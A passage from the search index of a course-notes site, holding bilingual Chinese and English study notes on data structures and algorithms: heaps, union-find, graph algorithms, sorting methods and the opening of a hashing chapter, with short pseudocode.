<p>\u5c06\u53f3\u5b50\u6811\u7684\u6700\u5c0f\u8282\u70b9\u6216\u8005\u5de6\u5b50\u6811\u7684\u6700\u5927\u8282\u70b9\u63d0\u5347\u5230\u88ab\u5220\u9664\u8282\u70b9\u7684\u4f4d\u7f6e\uff0c\u7136\u540e\u5220\u9664\u8be5\u8282\u70b9</p> </li> </ul> </li> </ul>"},{"location":"cs/fds/chapter3/#priority-queues-heaps","title":"Priority Queues (Heaps)","text":""},{"location":"cs/fds/chapter3/#adt","title":"ADT","text":"<ul> <li>Operations: Insert, DeleteMin, FindMin, ...</li> </ul>"},{"location":"cs/fds/chapter3/#simple-implementation","title":"Simple Implementation","text":"<ul> <li>Array: \\(O(1)\\) for Insert, \\(O(n)\\) for FindMin and then \\(O(n)\\) for delete</li> <li>Linked List: \\(O(1)\\) for Insert, \\(O(n)\\) for FindMin and then \\(O(1)\\) for delete</li> <li>Ordered Array: \\(O(n)\\) for find the position and then \\(O(n)\\) for insert, \\(O(1)\\) for DeleteMin or DeleteMax</li> <li>Ordered Linked List: \\(O(n)\\) for find the position and then \\(O(1)\\) for insert, \\(O(1)\\) for DeleteMin or DeleteMax</li> </ul>"},{"location":"cs/fds/chapter3/#binary-heap","title":"Binary Heap","text":"<p>complete binary tree with the heap-order property</p> <p>\u4f7f\u7528\u6570\u7ec4\u5b58\u50a8\uff0c\u4ece 1 \u5f00\u59cb\u7f16\u53f7\uff0c\u5bf9\u4e8e\u8282\u70b9 \\(i\\)\uff0c\u5176\u7236\u8282\u70b9\u4e3a \\(i/2\\)\uff0c\u5de6\u513f\u5b50\u4e3a \\(2i\\)\uff0c\u53f3\u513f\u5b50\u4e3a \\(2i+1\\)\u3002</p> <p>Heap Order Property</p> <p>A min tree is a tree in which the key value in each node is no larger than the key values in its children (if any). A min heap is a complete binary tree that is also a min tree.</p> <ul> <li>\u6700\u5c0f\u5806\uff1a\u6bcf\u4e2a\u8282\u70b9\u7684\u503c\u90fd\u5c0f\u4e8e\u7b49\u4e8e\u5176\u5b50\u8282\u70b9\u7684\u503c\u3002</li> <li>\u6700\u5927\u5806\uff1a\u6bcf\u4e2a\u8282\u70b9\u7684\u503c\u90fd\u5927\u4e8e\u7b49\u4e8e\u5176\u5b50\u8282\u70b9\u7684\u503c\u3002</li> </ul>"},{"location":"cs/fds/chapter3/#operations","title":"Operations","text":"<p>\u4ee5\u6700\u5c0f\u5806\u4e3a\u4f8b\u3002</p> <p>\u5411\u4e0a\u8c03\u6574\u548c\u5411\u4e0b\u8c03\u6574\uff1a</p> <pre><code>void upAdjust(int p) {\n    if (p == 1) return;\n    if (heap[p] &lt; heap[p/2]) {\n        swap(heap[p], heap[p/2]);\n        upAdjust(p/2);\n    }\n}\nvoid downAdjust(int p) {\n    int minIndex = p;\n    if (p*2 &lt;= size &amp;&amp; heap[p*2] &lt; heap[minIndex]) minIndex = p*2;\n    if (p*2+1 &lt;= size &amp;&amp; heap[p*2+1] &lt; heap[minIndex]) minIndex = p*2+1;\n    if (minIndex != p) {\n        swap(heap[p], heap[minIndex]);\n        downAdjust(minIndex);\n    }\n}\n</code></pre> <ul> <li>Insert: \u653e\u5230\u6700\u540e\uff0c\u7136\u540e\u5411\u4e0a\u8c03\u6574\u3002</li> <li>Deletemin: \u5c06\u6839\u8282\u70b9\u4e0e\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u4ea4\u6362\uff0c\u7136\u540e\u5220\u9664\u6700\u540e\u4e00\u4e2a\u8282\u70b9\uff0c\u5411\u4e0b\u8c03\u6574\u6839\u8282\u70b9\u3002</li> <li>FindMin: \u6839\u8282\u70b9\u3002</li> <li> <p>BuildHeap: \u4ece\u6700\u540e\u4e00\u4e2a\u975e\u53f6\u5b50\u8282\u70b9\u5f00\u59cb\uff0c\u5411\u4e0b\u8c03\u6574\u3002\u590d\u6742\u5ea6\u4e3a \\(O(n)\\)\u3002</p> <p>\u6240\u6709\u8282\u70b9\u9ad8\u5ea6\u4e4b\u548c</p> <p>\u5047\u8bbe\u6811\u7684\u9ad8\u5ea6\u4e3a \\(h\\)\uff0c\u5219\u9ad8\u5ea6\u4e3a \\(i\\) \u7684\u8282\u70b9\u6709 \\(2^{h-i}\\) \u4e2a\uff0c\u6240\u6709\u8282\u70b9\u9ad8\u5ea6\u4e4b\u548c\u4e3a</p> \\[ \\begin{aligned} S(n) &amp;= 2^{h-1} + 2^{h-2} \\times 2 + 2^{h-3} \\times 3 + \\dots + 2^{0} \\times h \\\\ &amp;= O(n - \\log_2(n+1)) \\\\ &amp;= O(n) \\end{aligned} \\] <p>\u6ce8\u610f\u5982\u679c\u5411\u4e0a\u8c03\u6574\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n \\log n)\\)\u3002</p> </li> </ul>"},{"location":"cs/fds/chapter3/#d-heaps","title":"d-Heaps","text":"<p>\u6bcf\u4e2a\u8282\u70b9\u6709 \\(d\\) \u4e2a\u5b50\u8282\u70b9\u3002</p> <p>\u5411\u4e0b\u8c03\u6574\u64cd\u4f5c\u9700\u8981\u6bd4\u8f83 \\(d\\) \u4e2a\u8282\u70b9\uff0c\u6240\u4ee5 DeleteMin \u64cd\u4f5c\u590d\u6742\u5ea6\u53d8\u4e3a \\(O(d \\log_d n)\\)\u3002</p>"},{"location":"cs/fds/chapter3/#_3","title":"\u9519\u9898\u6574\u7406","text":"<p>Question 1</p> <p>If a binary search tree of N nodes is complete, which one of the following statements is FALSE?</p> <p>False:</p> <ul> <li>the maximum key must be at a leaf node.</li> </ul> <p>\u6ce8\u610f\u6761\u4ef6\u3002</p>"},{"location":"cs/fds/chapter4/","title":"Union and Find","text":""},{"location":"cs/fds/chapter4/#the-disjoint-set-adt","title":"The Disjoint Set ADT","text":"<p>Relation \\(\\sim\\) is an equivalence relation iff its symmetric(\u5bf9\u79f0), reflexive(\u81ea\u53cd) and transitive(\u4f20\u9012).</p> <p>Two members \\(x, y\\) are said to be in the same equivalence class iff \\(x \\sim y\\).</p>"},{"location":"cs/fds/chapter4/#operations","title":"Operations","text":"<ul> <li>Union: combine two equivalence classes into one</li> <li>Find: determine which equivalence class a given element belongs to</li> </ul>"},{"location":"cs/fds/chapter4/#implementation","title":"Implementation","text":"<p><code>S[u]</code> \u4ee3\u8868\u8282\u70b9 <code>u</code> \u7684\u7236\u8282\u70b9\u3002</p>"},{"location":"cs/fds/chapter4/#implementation-1","title":"Implementation 1","text":"<p>\u6bcf\u4e2a\u96c6\u5408\u7684\u6839\u8282\u70b9\u4e0e\u4e00\u4e2a\u96c6\u5408\u7684\u7f16\u53f7\u5efa\u7acb\u53cc\u5411\u94fe\u8868\u3002</p>"},{"location":"cs/fds/chapter4/#implementation-2","title":"Implementation 2","text":"<p><code>S[root] = 0</code>\uff0c\u96c6\u5408\u7f16\u53f7\u4e3a\u6839\u8282\u70b9\u7f16\u53f7\u3002</p>"},{"location":"cs/fds/chapter4/#smart-union-algorithms","title":"Smart Union Algorithms","text":""},{"location":"cs/fds/chapter4/#union-by-size","title":"Union by Size","text":"<p>Let <code>S[root] = -size</code>\uff0c<code>size</code> \u4e3a\u96c6\u5408\u5927\u5c0f\u3002</p> <p>\u6bcf\u6b21 Union \u65f6\uff0c\u5c06\u5c0f\u96c6\u5408\u7684\u6839\u8282\u70b9\u6307\u5411\u5927\u96c6\u5408\u7684\u6839\u8282\u70b9\u3002</p> <p>\u65f6\u95f4\u590d\u6742\u5ea6\uff1a\\(n\\) \u6b21 Union \u64cd\u4f5c\uff0c\\(m\\) \u6b21 Find \u64cd\u4f5c\uff0c\u590d\u6742\u5ea6 \\(O(n + m \\log n)\\)\u3002</p>"},{"location":"cs/fds/chapter4/#union-by-height","title":"Union by Height","text":"<p>\u6bcf\u6b21 <code>Union</code> \u65f6\uff0c\u5c06\u9ad8\u5ea6\u5c0f\u7684\u6839\u8282\u70b9\u6307\u5411\u9ad8\u5ea6\u5927\u7684\u6839\u8282\u70b9\u3002</p>"},{"location":"cs/fds/chapter4/#path-compression","title":"Path Compression","text":"<p>\u8def\u5f84\u538b\u7f29\u3002</p> <pre><code>int find(int x) {\n    if (isroot(x)) return x;\n    else return S[x] = find(S[x]);\n}\n</code></pre>"},{"location":"cs/fds/chapter4/#time-complexity","title":"Time Complexity","text":"<p>\\(O(\\alpha(n))\\)\uff0c\u5176\u4e2d \\(\\alpha(n)\\) \u4e3a Ackermann \u51fd\u6570\u7684\u53cd\u51fd\u6570\u3002</p>"},{"location":"cs/fds/chapter5/","title":"Graph","text":""},{"location":"cs/fds/chapter5/#definition","title":"Definition","text":"<p>\\(G(V,E)\\) is a graph, where \\(V\\) is the set of vertices and \\(E\\) is the set of edges.</p> <ul> <li>Undirected gragh: \\((v_i, v_j)=(v_j, v_i)\\)</li> <li>Directed graph: \\(\\langle v_i, v_j \\rangle \\neq \\langle v_j, v_i \\rangle\\)</li> <li> <p>Restrictions:</p> <ul> <li>No self loop</li> <li>Multigraph is not considered</li> </ul> </li> <li> <p>Complete graph: with maximum number of edges</p> </li> <li> <p>Adjacent:</p> <ul> <li>\\(v_i\\) and \\(v_j\\) are adjacent if \\((v_i, v_j) \\in E\\)</li> <li>\\(v_i\\) is adjacent to \\(v_j\\) if \\(\\langle v_i, v_j \\rangle \\in E\\)</li> </ul> </li> <li> <p>Length of a path: number of edges in the path</p> </li> <li>Simple path: \\(v_0, v_1, \\cdots, v_k\\) are distinct</li> <li>Cycle: simple path with \\(v_0 = v_k\\)</li> <li>Strongly connected directed graph: for every pair of vertices \\(v_i\\) and \\(v_j\\), there is a path from \\(v_i\\) to \\(v_j\\) and a path from \\(v_j\\) to \\(v_i\\)</li> <li>Strongly connected component: a maximal strongly connected subgraph</li> </ul>"},{"location":"cs/fds/chapter5/#topological-sort","title":"Topological Sort","text":""},{"location":"cs/fds/chapter5/#definition_1","title":"Definition","text":"<ul> <li>AOV Network: \u6709\u5411\u56fe\uff0c\u6709\u5411\u8fb9\u8868\u793a\u5173\u7cfb\u3002</li> <li>Partial order\uff1atransitive and irreflexive</li> </ul>"},{"location":"cs/fds/chapter5/#algorithm","title":"Algorithm","text":"<pre><code>void Topo(Graph G) {\n    Queue Q;\n    for (each vertex v) {\n        if (indegree[v] == 0) {\n            Enqueue(Q, v);\n        }\n    }\n    while (!IsEmpty(Q)) {\n        v = Dequeue(Q);\n        print v;\n        for (each w adjacent to v) {\n            if (--indegree[w] == 0) {\n                Enqueue(Q, w);\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"cs/fds/chapter5/#shortest-path","title":"Shortest Path","text":""},{"location":"cs/fds/chapter5/#dijkstras-algorithm","title":"Dijkstra's Algorithm","text":"<pre><code>void Dijkstra(Graph G, Vertex s) {\n    MinHeap H;\n    T[s].dist = 0;\n    Insert(H, s);\n    while (!IsEmpty(H)) {\n        Vertex v = DeleteMin(H);\n        T[v].known = true;\n        for (each w adjacent to v) {\n            if (!T[w].known) {\n                if (T[v].dist + weight &lt; T[w].dist) {\n                    T[w].dist = T[v].dist + weight;\n                    T[w].path = v;\n                    Insert(H, w);\n                }\n            }\n        }\n    }\n}\n</code></pre> <ul> <li>Time complexity: \\(O((|V| + |E|) \\log |V|)\\)</li> <li>Space complexity: \\(O(|V|)\\)</li> </ul>"},{"location":"cs/fds/chapter5/#bellman-ford-algorithm","title":"Bellman-Ford Algorithm","text":"<p>with negative weight</p> <pre><code>void SPFA(Graph G, Vertex s) {\n    Queue Q;\n    T[s].dist = 0;\n    Enqueue(Q, s);\n    while (!IsEmpty(Q)) {\n        Vertex v = Dequeue(Q);\n        T[v].inqueue = false;\n        for (each w adjacent to v) {\n            if (T[v].dist + weight &lt; T[w].dist) {\n                T[w].dist = T[v].dist + weight;\n                T[w].path = v;\n                if (!T[w].inqueue) {\n                    Enqueue(Q, w);\n                    T[w].inqueue = true;\n                }\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"cs/fds/chapter5/#acyclic-graph","title":"Acyclic Graph","text":"<p>Use topological sort (BFS)</p>"},{"location":"cs/fds/chapter5/#network-flow","title":"Network Flow","text":"<ul> <li> <p>\u6b8b\u5dee\u56fe\uff1a\u8bbe \\(f\\) \u4e3a\u6d41\u91cf\uff0c\u5219\u6b8b\u5dee\u4e3a\uff1a</p> \\[ c_f(u, v) = \\begin{cases} c(u, v) - f(u, v) &amp; \\text{if } (u, v) \\in E \\\\ f(v, u) &amp; \\text{if } (v, u) \\in E \\\\ 0 &amp; \\text{otherwise} \\end{cases} \\] </li> <li> <p>\u627e\u6b8b\u5dee\u56fe\u4e2d\u4ece\u6e90\u70b9\u5230\u6c47\u70b9\u7684\u4e00\u6761\u7b80\u5355\u8def\u5f84\uff0c\u79f0\u4e3a\u589e\u5e7f\u8def\uff08augmenting path\uff09\u3002</p> </li> <li>\u589e\u5e7f\u8def\u6bcf\u6b21\u80fd\u63a8\u9001\u7684\u6d41\u91cf\u4e3a\u8def\u5f84\u4e0a\u6700\u5c0f\u7684\u6b8b\u5dee\u3002</li> <li>\u66f4\u65b0\u6b8b\u5dee\u56fe\uff0c\u76f4\u5230\u627e\u4e0d\u5230\u589e\u5e7f\u8def\u4e3a\u6b62\u3002</li> </ul>"},{"location":"cs/fds/chapter5/#minimum-spanning-tree","title":"Minimum Spanning Tree","text":""},{"location":"cs/fds/chapter5/#prims-algorithm","title":"Prim's Algorithm","text":"<ul> <li>Start from set with one vertex</li> <li>Find the minimum edge connecting the set and the rest vertices.</li> <li>Add the adjacent vertex to the set.</li> <li>Repeat until all vertices are in the set.</li> </ul>"},{"location":"cs/fds/chapter5/#krukals-algorithm","title":"Krukal's Algorithm","text":"<p>Sort all edges by weight. Then add the edge to the tree if it doesn't form a cycle. (use union-find)</p>"},{"location":"cs/fds/chapter5/#dfs","title":"DFS","text":""},{"location":"cs/fds/chapter5/#biconnectivity","title":"Biconnectivity","text":"<ul> <li>Biconnectivity \u53cc\u8fde\u901a\uff1a\u4efb\u610f\u4e24\u70b9\u4e4b\u95f4\u81f3\u5c11\u5b58\u5728\u4e24\u6761\u4e0d\u76f8\u4ea4\u7684\u8def\u5f84\u3002</li> <li>Articulation point \u5272\u70b9\uff1a\u5220\u9664\u8be5\u70b9\u540e\uff0c\u56fe\u4e0d\u518d\u8fde\u901a\u5206\u91cf\u6570\u91cf\u589e\u52a0\u4e86\u3002</li> <li>Bi-connected component \u53cc\u8fde\u901a\u5206\u91cf\uff1a\u6700\u5927\u7684\u53cc\u8fde\u901a\u5b50\u56fe\u3002</li> </ul>"},{"location":"cs/fds/chapter5/#tarjans-algorithm","title":"Tarjan's Algorithm","text":"<ul> <li><code>dfn[u]</code>\uff1a\u8282\u70b9 <code>u</code> \u7684 dfs \u5e8f\u3002</li> <li><code>low[u]</code>\uff1a\u8282\u70b9 <code>u</code> \u6216\u5176\u5b50\u6811\u80fd\u591f\u8ffd\u6eaf\u5230\u7684\u6700\u65e9\u7684\u7956\u5148\u8282\u70b9\u3002</li> </ul> <pre><code>void Tarjan(Graph G, Vertex u) {\n    dfn[u] = low[u] = ++cnt;\n    stack.push(u);\n    instack[u] = true;\n    for (each v adjacent to u) {\n        if (!dfn[v]) {\n            Tarjan(G, v);\n            low[u] = min(low[u], low[v]);\n        } else if (instack[v]) {\n            low[u] = min(low[u], dfn[v]);\n        }\n    }\n    if (dfn[u] == low[u]) {\n        ++bcc_cnt;\n        do {\n            v = stack.pop();\n            bcc[v] = bcc_cnt;\n            instack[v] = false;\n        } while (u != v);\n    }\n}\nvoid FindBCC(Graph G) {\n    for (each v) {\n        if (!dfn[v]) {\n            Tarjan(G, v);\n        }\n    }\n}\n</code></pre>"},{"location":"cs/fds/chapter5/#euler-circuits-and-paths","title":"Euler Circuits and Paths","text":"<ul> <li> <p>Euler Path\uff1a\u7ecf\u8fc7\u6240\u6709\u8fb9\u4e00\u6b21\u7684\u901a\u8def\u3002</p> <p>\u6761\u4ef6\uff1a\u6709\u4e14\u4ec5\u6709\u4e24\u4e2a\u8282\u70b9\u5ea6\u6570\u4e3a\u5947\u6570\uff0c\u5176\u4f59\u8282\u70b9\u5ea6\u6570\u4e3a\u5076\u6570\u3002</p> <p>Algorithm</p> <p>\u4ece\u5ea6\u6570\u4e3a\u5947\u6570\u7684\u8282\u70b9\u5f00\u59cb dfs\uff0c\u904d\u5386\u5b8c\u6240\u6709\u8fb9\u540e\uff0c\u6b27\u62c9\u8def\u4e3a dfs \u7684\u540e\u5e8f\u904d\u5386\u3002</p> </li> <li> <p>Euler Circuit\uff1a\u7ecf\u8fc7\u6240\u6709\u8fb9\u4e00\u6b21\u7684\u56de\u8def\u3002</p> <p>\u6761\u4ef6\uff1a\u6240\u6709\u8282\u70b9\u5ea6\u6570\u4e3a\u5076\u6570\u3002</p> <p>Algorithm</p> <p>Hierholzer's Algorithm</p> <p>\u4ece\u4e00\u6761\u56de\u8def\u5f00\u59cb\uff0c\u6bcf\u6b21\u5c06\u56de\u8def\u4e0a\u4efb\u610f\u8282\u70b9\u66ff\u6362\u4e3a\u5b50\u56de\u8def\uff0c\u76f4\u5230\u6240\u6709\u8fb9\u90fd\u88ab\u8bbf\u95ee\u3002</p> </li> <li> <p>Hamiltonian Path\uff1a\u7ecf\u8fc7\u6240\u6709\u8282\u70b9\u4e00\u6b21\u7684\u901a\u8def\u3002</p> </li> </ul>"},{"location":"cs/fds/chapter6/","title":"Sorting","text":""},{"location":"cs/fds/chapter6/#shell-sort","title":"Shell Sort","text":"<p>Define an increment sequence \\(1 = h_1 &lt; h_2 &lt; \\cdots &lt; h_t\\).</p> <p>Define \\(h\\)-sort: \u7528\u63d2\u5165\u6392\u5e8f\u6392\u5e8f\u539f\u6570\u7ec4\u7684\u5b50\u5e8f\u5217 \\((a_0, a_h, a_{2h}, \\cdots), (a_1, a_{1+h}, a_{1+2h}, \\cdots), \\cdots\\)</p> <p>Shell sort: \u6309\u7167 \\(k = t, t-1, \\cdots, 1\\) \u7684\u987a\u5e8f\uff0c\u5bf9\u6bcf\u4e2a \\(k\\) \u8fdb\u884c \\(h_k\\)-sort\u3002</p>"},{"location":"cs/fds/chapter6/#time-complexity","title":"Time Complexity","text":"<p>\u4e0e\u589e\u91cf\u5e8f\u5217\u6709\u5173\u3002</p>"},{"location":"cs/fds/chapter6/#shells-increment-sequence","title":"Shell's increment sequence","text":"<p>\\(h_t = \\lfloor \\frac{n}{2} \\rfloor, h_{k+1} = \\lfloor \\frac{h_k}{2} \\rfloor\\)</p> <p>\u6700\u574f\u60c5\u51b5\u4e0b\uff0c\u53ea\u6709\u6700\u540e\u4e00\u6b21\u6392\u5e8f\u8fdb\u884c\u4e86\u4ea4\u6362\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n^2)\\)\u3002</p>"},{"location":"cs/fds/chapter6/#hibbards-increment-sequence","title":"Hibbard's increment sequence","text":"<p>\\(h_k = 2^k - 1\\)</p> <p>\u6700\u574f\u60c5\u51b5\u4e0b\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n^{3/2})\\)\u3002</p> <p>\u5e73\u5747\u60c5\u51b5\u4e0b\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n^{5/4})\\)\u3002</p>"},{"location":"cs/fds/chapter6/#heap-sort","title":"Heap Sort","text":"<p>\u4e24\u79cd\u5b9e\u73b0\uff1a</p> <ul> <li>\u5355\u72ec\u5efa\u5806\uff0c\u7136\u540e\u6bcf\u6b21\u53d6\u51fa\u6700\u5c0f\u503c\u3002</li> <li>\u5728\u539f\u6570\u7ec4\u4e0a\u5efa\u5806\uff0c\u6bcf\u6b21\u53d6\u51fa\u6700\u5c0f\u503c\u3002</li> </ul> <p>\u4e00\u822c\u91c7\u7528\u7b2c\u4e8c\u79cd\u5b9e\u73b0\u3002\u7b2c\u4e00\u79cd\u5b9e\u73b0\u7a7a\u95f4\u7ffb\u500d\u3002</p> <p>\u7b2c\u4e8c\u79cd\u5b9e\u73b0\u7684\u5e73\u5747\u6bd4\u8f83\u6b21\u6570\u4e3a \\(2n \\log n - O(n \\log \\log n)\\)\u3002</p>"},{"location":"cs/fds/chapter6/#merge-sort","title":"Merge Sort","text":"<p>Each merge step takes \\(O(n)\\) time. The number of merge steps is \\(O(\\log n)\\).</p> <p>The total time complexity is \\(O(n \\log n)\\).</p>"},{"location":"cs/fds/chapter6/#quick-sort","title":"Quick Sort","text":"<p>\u6bcf\u6b21\u9009\u53d6\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a pivot\uff0c\u7136\u540e\u5c06\u6570\u7ec4\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u5de6\u8fb9\u7684\u5143\u7d20\u90fd\u5c0f\u4e8e pivot\uff0c\u53f3\u8fb9\u7684\u5143\u7d20\u90fd\u5927\u4e8e pivot\u3002\u9012\u5f52\u8fdb\u884c\u6392\u5e8f\u3002</p> <p>\u590d\u6742\u5ea6\u53d6\u51b3\u4e8e pivot \u7684\u9009\u62e9\u3002</p> <ul> <li>Wrong choice: <code>pivot = a[0]</code></li> <li>Safe choice: <code>pivot = a[rand() % n]</code> \u4f46\u662f\u751f\u6210\u968f\u673a\u6570\u5b58\u5728\u989d\u5916\u5f00\u9500</li> <li>Better choice: <code>pivot = median(a[0], a[n/2], a[n-1])</code></li> </ul>"},{"location":"cs/fds/chapter6/#partitioning-strategy","title":"Partitioning Strategy","text":"<ol> <li>\u9009\u53d6 pivot\uff0c\u5c06\u5176\u653e\u5230\u6700\u540e\u3002</li> <li>\u4e24\u4e2a\u6307\u9488 <code>i</code> \u521d\u59cb\u6307\u5411\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c<code>j</code> \u521d\u59cb\u6307\u5411\u9664\u4e86 pivot \u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002</li> <li><code>i</code> \u4ece\u5de6\u5411\u53f3\u626b\u63cf\u627e\u5230\u7b2c\u4e00\u4e2a\u5c0f\u4e8e pivot \u7684\u5143\u7d20\uff0c<code>j</code> \u4ece\u53f3\u5411\u5de6\u626b\u63cf\u627e\u5230\u7b2c\u4e00\u4e2a\u5927\u4e8e pivot \u7684\u5143\u7d20\uff0c\u4ea4\u6362\u4e24\u4e2a\u5143\u7d20\u3002</li> <li>\u91cd\u590d 3 \u76f4\u5230 <code>j &lt; i</code>\uff0c\u6b64\u65f6 <code>i</code> \u6307\u5411\u7b2c\u4e00\u4e2a\u5927\u4e8e pivot \u7684\u5143\u7d20\uff0c\u4ea4\u6362 <code>a[i]</code> \u548c <code>a[n-1]</code>\u3002</li> <li>\u9012\u5f52\u6392\u5e8f <code>a[0..i-1]</code> \u548c <code>a[i+1..n-1]</code>\u3002</li> </ol> <p>\u82e5\u9047\u5230\u4e0e pivot \u76f8\u540c\u7684\u6570\uff0c\u5219 <code>i</code> \u548c <code>j</code> \u90fd\u4e0d\u79fb\u52a8\uff0c\u8fdb\u884c\u4ea4\u6362\uff0c\u4f7f\u5f97\u6700\u540e pivot \u5728\u4e2d\u95f4\u3002\u590d\u6742\u5ea6\u4e3a \\(O(n\\log n)\\)\u3002</p> <p>\u5982\u679c\u4e0d\u4ea4\u6362\uff0c\u53ef\u80fd\u4f1a\u51fa\u73b0\u6700\u574f\u60c5\u51b5\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n^2)\\)\u3002</p>"},{"location":"cs/fds/chapter6/#small-arrays","title":"Small Arrays","text":"<p>Cutoff\uff1a\u5728\u9012\u5f52\u8fc7\u7a0b\u4e2d\uff0c\u5bf9\u4e8e\u5c0f\u6570\u7ec4\uff0c\u4f7f\u7528\u63d2\u5165\u6392\u5e8f\uff0c\u5927\u6570\u7ec4\u4f7f\u7528\u5feb\u901f\u6392\u5e8f\u3002</p>"},{"location":"cs/fds/chapter6/#implementation","title":"Implementation","text":"<ul> <li>Median3: \u5c06\u5de6\u4e2d\u53f3\u4e09\u4e2a\u5143\u7d20\u8fdb\u884c\u6392\u5e8f\uff0c\u53d6\u4e2d\u95f4\u503c\u4f5c\u4e3a pivot\u3002</li> <li>Qsort: \u9012\u5f52\u6392\u5e8f\u3002</li> </ul>"},{"location":"cs/fds/chapter6/#analysis","title":"Analysis","text":"\\[T(n) = T(i) + T(n-i-1) + O(n)\\] <ul> <li>Worsest Case: \\(T(n) = T(n-1) + O(n)\\)\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n^2)\\)\u3002</li> <li>Best Case: \\(T(n) = 2T(n/2) + O(n)\\)\uff0c\u590d\u6742\u5ea6\u4e3a \\(O(n \\log n)\\)\u3002</li> <li>Average: \\(T(n) = O(n \\log n)\\)\u3002</li> </ul> <p>Find the k-th</p> <p>\u6bcf\u6b21\u6392\u5e8f\u597d\u4e4b\u540e\uff0c\u80fd\u591f\u5f97\u51fa pivot \u662f\u7b2c\u51e0\u5927\u7684\u5143\u7d20\uff0c\u7136\u540e\u53ea\u5bf9\u5de6\u8fb9\u6216\u8005\u53f3\u8fb9\u8fdb\u884c\u6392\u5e8f\u3002</p>"},{"location":"cs/fds/chapter6/#sorting-large-structures","title":"Sorting Large Structures","text":"<p>\u7528\u6307\u9488\u6392\u5e8f\u3002</p> <p>Note</p> <p>\u53ea\u9700\u8981\u4e00\u4e2a\u591a\u4f59\u7684\u7a7a\u95f4\uff0c\u5373\u53ef\u5c06\u6700\u540e\u7684\u7ed3\u679c\u7684\u539f\u59cb\u6570\u636e\u5b58\u50a8\u5728\u6570\u7ec4\u4e2d\u3002</p>"},{"location":"cs/fds/chapter6/#general-lower-bound-for-sorting","title":"General Lower Bound for Sorting","text":"<p>Any algorithm that sorts by comparisons only must have a worst case computing time of \\(\\Omega(n \\log n)\\).</p>"},{"location":"cs/fds/chapter6/#bucket-sort","title":"Bucket Sort","text":"<p>\u6570\u636e\u7684\u8303\u56f4\u6709\u9650\uff0c\u5c06\u76f8\u540c\u6570\u636e\u6839\u636e\u6570\u636e\u5185\u5bb9\u5206\u914d\u5230\u4e0d\u540c\u7684\u6876\u4e2d\uff0c\u7136\u540e\u6309\u987a\u5e8f\u8f93\u51fa\u6876\u4e2d\u7684\u6570\u636e\u3002</p> <p>\u5047\u8bbe\u6570\u636e\u6709 \\(n\\) \u4e2a\uff0c\u8303\u56f4\u5927\u5c0f\u4e3a \\(m\\)\uff0c\u5219\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(n + m)\\)\u3002</p>"},{"location":"cs/fds/chapter6/#radix-sort","title":"Radix Sort","text":"<p>\u5c06\u6570\u636e\u6309\u7167\u4f4d\u8fdb\u884c\u6392\u5e8f\u3002Sort according to the Least Significant Digit (LSD) first.</p> <p>\u5148\u6309\u7167\u4e2a\u4f4d\u6392\u5e8f\uff0c\u7136\u540e\u6309\u7167\u5341\u4f4d\u6392\u5e8f\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p> <p>\u82e5\u6bcf\u4e2a\u4f4d\u7684\u8303\u56f4\u4e3a \\(b\\)\uff0c\u6570\u636e\u7684\u4f4d\u6570\u4e3a \\(p\\)\uff0c\u5219\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(p(n + b))\\)\u3002</p> <p>\u7b26\u53f7\u8868\u8fbe\uff1a</p> <ul> <li>\\(K_i^j\\): \u7b2c \\(i\\) \u4e2a\u5173\u952e\u5b57\u7684\u7b2c \\(j\\) \u4f4d</li> <li>\\(K_i^0\\): the most significant digit (MSD)</li> <li>\\(K_i^{p-1}\\): the least significant digit (LSD)</li> </ul> <p>\u4e0d\u540c\u6392\u5e8f\u987a\u5e8f\uff1a</p> <ul> <li>MSD (Most Significant Digit) sort: first sort \\(K^0\\)</li> <li>LSD (Least Significant Digit) sort: first sort \\(K^{p-1}\\)</li> </ul>"},{"location":"cs/fds/chapter6/#stablity","title":"Stablity","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\uff0c\u5982\u679c\u5b58\u5728\u4e24\u4e2a\u76f8\u7b49\u7684\u5143\u7d20\uff0c</p> <ul> <li>\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u4e0d\u53d8\uff0c\u5219\u79f0\u8fd9\u4e2a\u6392\u5e8f\u7b97\u6cd5\u662f\u7a33\u5b9a\u7684</li> <li>\u6392\u5e8f\u540e\u5b83\u4eec\u7684\u76f8\u5bf9\u4f4d\u7f6e\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u5219\u79f0\u8fd9\u4e2a\u6392\u5e8f\u7b97\u6cd5\u662f\u4e0d\u7a33\u5b9a\u7684</li> </ul> <p>\u7a33\u5b9a\u6392\u5e8f\uff1a\u5192\u6ce1\u3001\u5f52\u5e76\u3001\u63d2\u5165\u3001\u57fa\u6570\u3001\u6876\u6392</p> <p>\u4e0d\u7a33\u5b9a\u6392\u5e8f\uff1a\u5feb\u6392\u3001\u5e0c\u5c14\u3001\u5806\u6392\u3001\u9009\u62e9</p>"},{"location":"cs/fds/chapter7/","title":"Hashing","text":""},{"location":"cs/fds/chapter7/#adt","title":"ADT","text":"<ul> <li>Objects: name-attribute pairs</li> <li>Operations: Insert, Delete, Find, ...</li> </ul>"},{"location":"cs/fds/chapter7/#hash-table","title":"Hash Table","text":"<ul> <li>Hash function: \\(f(x) = \\text{position of} \\; x \\; \\text{in ht[]}\\)</li> <li>\\(T\\): \\(x\\) \u6240\u6709\u53ef\u80fd\u53d6\u503c\u7684\u60c5\u51b5\u6570\u3002</li> <li>\\(n\\): total number of identifiers \u54c8\u5e0c\u8868\u4e2d\u6807\u8bc6\u7b26\u7684\u4e2a\u6570\u3002</li> <li>identifier density: \\(n/T\\)</li> <li>loading density: \\(n/\\text{size of table}\\)</li> <li>number of identifiers: \\(b\\) (TableSize)</li> <li>number slots of each identifiers: \\(s\\)</li> 